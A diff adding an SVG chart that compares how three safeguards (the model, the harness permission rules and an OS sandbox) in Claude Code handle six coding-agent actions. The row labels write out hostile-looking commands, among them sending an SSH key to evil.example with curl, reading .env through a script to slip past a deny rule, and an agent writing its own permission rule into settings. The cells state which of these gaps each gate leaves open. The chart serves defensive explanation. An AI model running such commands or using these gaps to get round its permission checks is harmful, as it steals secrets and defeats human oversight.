@@ -1,0 +1,89 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="660" height="468" viewBox="0 0 660 468" font-family="Inter, 'Segoe UI', Helvetica, Arial, sans-serif">
+  <rect width="660" height="468" fill="#08090A"/>
+
+  <text x="24" y="34" font-size="16" font-weight="700" fill="#E4E5E9">Same attempt, three gates</text>
+  <text x="24" y="54" font-size="11.5" fill="#B9BEC6">What each gate can see when a coding agent tries the action.</text>
+  <text x="24" y="69" font-size="11.5" fill="#B9BEC6">Assumes /sandbox on in its default auto-allow mode; other permission settings at their defaults.</text>
+
+  <!-- column headers -->
+  <text x="335" y="100" font-size="11.5" font-weight="700" fill="#E4E5E9" text-anchor="middle">Gate 1 · model</text>
+  <text x="335" y="114" font-size="10" fill="#8A8F98" text-anchor="middle">reads the instruction</text>
+  <text x="465" y="100" font-size="11.5" font-weight="700" fill="#E4E5E9" text-anchor="middle">Gate 2 · harness</text>
+  <text x="465" y="114" font-size="10" fill="#8A8F98" text-anchor="middle">matches the call text</text>
+  <text x="595" y="100" font-size="11.5" font-weight="700" fill="#E4E5E9" text-anchor="middle">Gate 3 · OS sandbox</text>
+  <text x="595" y="114" font-size="10" fill="#8A8F98" text-anchor="middle">watches the process</text>
+
+  <line x1="24" y1="124" x2="636" y2="124" stroke="#1E2630" stroke-width="1"/>
+
+  <!-- row 1 -->
+  <text x="24" y="149" font-size="11" fill="#E4E5E9">cat .env inside a Bash command</text>
+  <text x="24" y="163" font-size="10" fill="#8A8F98">Read(./.env) is in the deny list</text>
+  <rect x="274" y="136" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="335" y="157" font-size="10.5" fill="#B9BEC6" text-anchor="middle">advisory</text>
+  <rect x="404" y="136" width="122" height="34" rx="5" fill="#45A87D"/>
+  <text x="465" y="157" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">stops: file command</text>
+  <rect x="534" y="136" width="122" height="34" rx="5" fill="#6B7FE3"/>
+  <text x="595" y="157" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">open unless denyRead</text>
+
+  <!-- row 2 -->
+  <text x="24" y="195" font-size="11" fill="#E4E5E9">python probe.py that opens .env</text>
+  <text x="24" y="209" font-size="10" fill="#8A8F98">same deny rule in place</text>
+  <rect x="274" y="182" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="335" y="203" font-size="10.5" fill="#B9BEC6" text-anchor="middle">advisory</text>
+  <rect x="404" y="182" width="122" height="34" rx="5" fill="#B5822A"/>
+  <text x="465" y="203" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">sees only the string</text>
+  <rect x="534" y="182" width="122" height="34" rx="5" fill="#6B7FE3"/>
+  <text x="595" y="203" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">open unless denyRead</text>
+
+  <!-- row 3 -->
+  <text x="24" y="241" font-size="11" fill="#E4E5E9">curl -d @id_rsa https://evil.example</text>
+  <text x="24" y="255" font-size="10" fill="#8A8F98">only rule: Bash(curl http://github.com/ *)</text>
+  <rect x="274" y="228" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="335" y="249" font-size="10.5" fill="#B9BEC6" text-anchor="middle">advisory</text>
+  <rect x="404" y="228" width="122" height="34" rx="5" fill="#B5822A"/>
+  <text x="465" y="249" font-size="10" font-weight="700" fill="#08090A" text-anchor="middle">pattern narrows nothing</text>
+  <rect x="534" y="228" width="122" height="34" rx="5" fill="#45A87D"/>
+  <text x="595" y="249" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">new host: prompt</text>
+
+  <!-- row 4 -->
+  <text x="24" y="287" font-size="11" fill="#E4E5E9">git push origin main</text>
+  <text x="24" y="301" font-size="10" fill="#8A8F98">CLAUDE.md says never; github.com allowed</text>
+  <rect x="274" y="274" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="335" y="295" font-size="10.5" fill="#B9BEC6" text-anchor="middle">advisory</text>
+  <rect x="404" y="274" width="122" height="34" rx="5" fill="#6B7FE3"/>
+  <text x="465" y="295" font-size="10" font-weight="700" fill="#08090A" text-anchor="middle">needs Bash(git push *)</text>
+  <rect x="534" y="274" width="122" height="34" rx="5" fill="#B5822A"/>
+  <text x="595" y="295" font-size="10" font-weight="700" fill="#08090A" text-anchor="middle">sees host, not intent</text>
+
+  <!-- row 5 -->
+  <text x="24" y="333" font-size="11" fill="#E4E5E9">echo ... &gt; .claude/settings.json</text>
+  <text x="24" y="347" font-size="10" fill="#8A8F98">a command granting itself a rule</text>
+  <rect x="274" y="320" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="335" y="341" font-size="10.5" fill="#B9BEC6" text-anchor="middle">advisory</text>
+  <rect x="404" y="320" width="122" height="34" rx="5" fill="#6B7FE3"/>
+  <text x="465" y="341" font-size="10" font-weight="700" fill="#08090A" text-anchor="middle">prompt in regular mode</text>
+  <rect x="534" y="320" width="122" height="34" rx="5" fill="#45A87D"/>
+  <text x="595" y="341" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">protected path: denied</text>
+
+  <!-- row 6 -->
+  <text x="24" y="379" font-size="11" fill="#E4E5E9">Edit tool writes ~/.zshrc</text>
+  <text x="24" y="393" font-size="10" fill="#8A8F98">built-in file tool, not Bash</text>
+  <rect x="274" y="366" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="335" y="387" font-size="10.5" fill="#B9BEC6" text-anchor="middle">advisory</text>
+  <rect x="404" y="366" width="122" height="34" rx="5" fill="#45A87D"/>
+  <text x="465" y="387" font-size="10.5" font-weight="700" fill="#08090A" text-anchor="middle">outside cwd: prompt</text>
+  <rect x="534" y="366" width="122" height="34" rx="5" fill="#161B22"/>
+  <text x="595" y="387" font-size="10.5" fill="#B9BEC6" text-anchor="middle">not on this path</text>
+
+  <!-- legend -->
+  <rect x="24" y="418" width="12" height="12" rx="2" fill="#45A87D"/>
+  <text x="42" y="428" font-size="10" fill="#B9BEC6">stops or prompts</text>
+  <rect x="146" y="418" width="12" height="12" rx="2" fill="#B5822A"/>
+  <text x="164" y="428" font-size="10" fill="#B9BEC6">lets it through</text>
+  <rect x="256" y="418" width="12" height="12" rx="2" fill="#6B7FE3"/>
+  <text x="274" y="428" font-size="10" fill="#B9BEC6">stops only if configured</text>
+  <rect x="412" y="418" width="12" height="12" rx="2" fill="#161B22" stroke="#1E2630"/>
+  <text x="430" y="428" font-size="10" fill="#B9BEC6">advisory, or not on this path</text>
+
+  <text x="24" y="454" font-size="9.5" fill="#5A6069">Our reading of the Claude Code permissions and sandboxing docs (code.claude.com), September 2026. Not a measurement.</text>
+</svg>
